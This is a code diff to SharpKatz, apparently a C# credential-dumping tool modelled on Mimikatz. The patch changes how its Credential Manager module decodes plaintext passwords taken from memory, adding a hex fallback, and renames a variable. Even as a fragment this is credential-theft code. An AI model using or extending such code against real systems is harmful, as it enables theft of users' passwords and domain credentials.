@@ -104,41 +104,48 @@ namespace SharpKatz.Module
 
                     if (msvDecryptedPasswordBytes != null && msvDecryptedPasswordBytes.Length > 0)
                     {
-
-                        passDecrypted = Encoding.Unicode.GetString(msvDecryptedPasswordBytes);
+                        UnicodeEncoding encoder = new UnicodeEncoding(false, false, true);
+                        try
+                        {
+                            passDecrypted = encoder.GetString(msvDecryptedPasswordBytes);
+                        }
+                        catch (Exception)
+                        {
+                            passDecrypted = Utility.PrintHexBytes(msvDecryptedPasswordBytes);
+                        }
                     }
 
                     if (!string.IsNullOrEmpty(username) && username.Length > 1)
                     {
-                        Credential.CredMan sspentry = new Credential.CredMan();
-                        sspentry.Reference = reference;
+                        Credential.CredMan credmanentry = new Credential.CredMan();
+                        credmanentry.Reference = reference;
                         if (!string.IsNullOrEmpty(username))
                         {
-                            sspentry.UserName = username;
+                            credmanentry.UserName = username;
                         }
                         else
                         {
-                            sspentry.UserName = "[NULL]";
+                            credmanentry.UserName = "[NULL]";
                         }
 
                         if (!string.IsNullOrEmpty(domain))
                         {
-                            sspentry.DomainName = domain;
+                            credmanentry.DomainName = domain;
                         }
                         else
                         {
-                            sspentry.DomainName = "[NULL]";
+                            credmanentry.DomainName = "[NULL]";
                         }
 
                         // Check if password is present
                         if (!string.IsNullOrEmpty(passDecrypted))
                         {
-                            sspentry.Password = passDecrypted;
+                            credmanentry.Password = passDecrypted;
 
                         }
                         else
                         {
-                            sspentry.Password = "[NULL]";
+                            credmanentry.Password = "[NULL]";
                         }
 
                         Logon currentlogon = logonlist.FirstOrDefault(x => x.LogonId.HighPart == luid.HighPart && x.LogonId.LowPart == luid.LowPart);
@@ -147,7 +154,7 @@ namespace SharpKatz.Module
                             currentlogon = new Logon(luid);
                             currentlogon.UserName = username;
                             currentlogon.Credman = new List<Credential.CredMan>();
-                            currentlogon.Credman.Add(sspentry);
+                            currentlogon.Credman.Add(credmanentry);
                             logonlist.Add(currentlogon);
                         }
                         else
@@ -155,7 +162,7 @@ namespace SharpKatz.Module
                             if (currentlogon.Credman == null)
                                 currentlogon.Credman = new List<Credential.CredMan>();
 
-                            currentlogon.Credman.Add(sspentry);
+                            currentlogon.Credman.Add(credmanentry);
                         }
                     }
                     reference++;
